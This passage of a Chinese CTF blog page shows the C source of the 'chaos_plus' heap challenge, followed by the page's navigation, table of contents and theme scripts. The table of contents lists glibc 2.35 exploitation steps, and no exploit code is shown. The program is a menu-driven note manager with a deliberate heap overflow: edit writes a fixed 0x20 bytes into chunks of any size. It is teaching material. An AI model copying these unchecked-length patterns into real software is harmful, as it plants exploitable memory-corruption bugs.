class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  题目源代码</span></span><br><span class="line"><span class="comment">/*************************************************************************</span></span><br><span class="line"><span class="comment">    &gt; File Name: yx.c</span></span><br><span class="line"><span class="comment">    &gt; Author: zll</span></span><br><span class="line"><span class="comment">    &gt; Mail: zhnllion@126.com </span></span><br><span class="line"><span class="comment">    &gt; Created Time: 2024年05月06日 星期一 10时43分19秒</span></span><br><span class="line"><span class="comment"> ************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *buf[<span class="number">80</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;1.Add Chaos!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;2.Del Chaos!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;3.Edit Chaos!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;4.Print Chaos!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;5.Exit!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> i, v2;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; ; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (i &gt; <span class="number">9</span>) &#123;	</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!buf[i]) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Please Input Size:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">	buf[i] = <span class="built_in">malloc</span>(v2);</span><br><span class="line">	<span class="keyword">if</span> (!buf[i]) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Allocate Error\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Content of Chaos!:&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>, buf[i], v2);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Successful&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">delete</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> v2;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Please Input index:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( v2 &lt;= <span class="number">9</span> &amp;&amp; buf[v2] ) &#123;</span><br><span class="line">		<span class="built_in">free</span>(buf[v2]);</span><br><span class="line">		buf[v2] = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> v2;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0xFFFFFFFFL</span>L;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> v2;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Please Input index:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( v2 &lt;= <span class="number">9</span> &amp;&amp; buf[v2] ) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Change Chaos Content:&quot;</span>);</span><br><span class="line">		read(<span class="number">0</span>, buf[v2], <span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0xFFFFFFFFL</span>L;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> v2;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Please Input index:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( v2 &lt;= <span class="number">9</span> &amp;&amp; buf[v2] ) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(buf[v2]);</span><br><span class="line">		<span class="keyword">return</span> v2;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0xFFFFFFFFL</span>L;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> v4;</span><br><span class="line"></span><br><span class="line">	init();</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		menu();</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Please Choice:&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span> (v4) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				add();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				delete();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				edit();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">				show();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>更新: 2026-04-27 20:59:52<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/trs5s1cskesxttbk">https://www.yuque.com/idcm/wnemg9/trs5s1cskesxttbk</a></p>
+</blockquote>
+
+    </div>
+    <footer class="article-footer">
+      
+      
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="index" class="lazyload">
+        <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/HouseofApple2libc-2.35/index/" aria-label="前一篇: index" title="前一篇: index"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            index
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="index" class="lazyload">
+      <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/glibc-2.35%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/index/" aria-label="后一篇: index"  title="后一篇: index"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          index
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      SEZUVEM=
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        292.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        24:34
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ISCC-2024-chaos-plus-%E5%A0%86%E6%A0%88%E7%BB%93%E5%90%88"><span class="toc-number">1.</span> <span class="toc-text">[ISCC 2024] chaos_plus(堆栈结合)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#chaos-plus-UAF-libc-2-35"><span class="toc-number">1.1.</span> <span class="toc-text">chaos_plus(UAF libc-2.35)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">程序分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">1.2.1.</span> <span class="toc-text">main</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#menu"><span class="toc-number">1.2.2.</span> <span class="toc-text">menu</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#add"><span class="toc-number">1.2.3.</span> <span class="toc-text">add</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#delete"><span class="toc-number">1.2.4.</span> <span class="toc-text">delete</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#edit"><span class="toc-number">1.2.5.</span> <span class="toc-text">edit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#printf"><span class="toc-number">1.2.6.</span> <span class="toc-text">printf</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">EXP 思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%B3%84%E9%9C%B2-Libc-%E5%9F%BA%E5%9D%80-Unsorted-Bin-%E6%B3%84%E9%9C%B2"><span class="toc-number">1.3.1.</span> <span class="toc-text">1. 泄露 Libc 基址 (Unsorted Bin 泄露)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%B3%84%E9%9C%B2%E5%A0%86%E5%9F%BA%E5%9D%80-%E7%BB%95%E8%BF%87-Safe-Linking"><span class="toc-number">1.3.2.</span> <span class="toc-text">2. 泄露堆基址 (绕过 Safe-Linking)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%E5%A0%86%E6%BA%A2%E5%87%BA-UAF-%E6%9E%84%E9%80%A0-Chunk-Overlap"><span class="toc-number">1.3.3.</span> <span class="toc-text">3. 利用堆溢出&#x2F;UAF 构造 Chunk Overlap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%B3%84%E9%9C%B2%E6%A0%88%E5%9C%B0%E5%9D%80-%E5%88%A9%E7%94%A8-environ"><span class="toc-number">1.3.4.</span> <span class="toc-text">4. 泄露栈地址 (利用 environ)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E8%AE%A1%E7%AE%97%E6%A0%88%E6%8C%87%E9%92%88"><span class="toc-number">1.3.5.</span> <span class="toc-text">5. 计算栈指针</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E5%9C%A8%E6%A0%88%E4%B8%8A%E5%B8%83%E7%BD%AE-ROP-%E9%93%BE"><span class="toc-number">1.3.6.</span> <span class="toc-text">6. 在栈上布置 ROP 链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E8%A7%A6%E5%8F%91-ROP"><span class="toc-number">1.3.7.</span> <span class="toc-text">7. 触发 ROP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP"><span class="toc-number">1.4.</span> <span class="toc-text">总 EXP:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C-%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">C 源代码：</span></a></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "SEZUVEM=",
+          title: "[ISCC2024]chaos_plus(堆栈结合)",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/glibc-2.35%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/%5BISCC2024%5Dchaos_plus(%E5%A0%86%E6%A0%88%E7%BB%93%E5%90%88)/",
+          excerpt: "",
+          description: "",
+          stripContent: "[ISCC 2024] chaos_plus(堆栈结合)网上有师傅对 [ISCC 2024] chaos 进行了修改，抬高了 libc 版本至 2.35 并修改了部分函数，思路可以供自己去学习高版本 libc 的堆攻击，也认识了 Safe-Linking  基址机制。总而言之，是一道非常好的题目。 参考资料：https://blog.csdn.net/j284886202/article/details/139119047 chaos_plus(UAF libc-2.35) 程序分析：main1",
+          date: "Tue Apr 28 2026 18:25:57 GMT+0800",
+          updated: "Tue Apr 28 2026 19:22:09 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
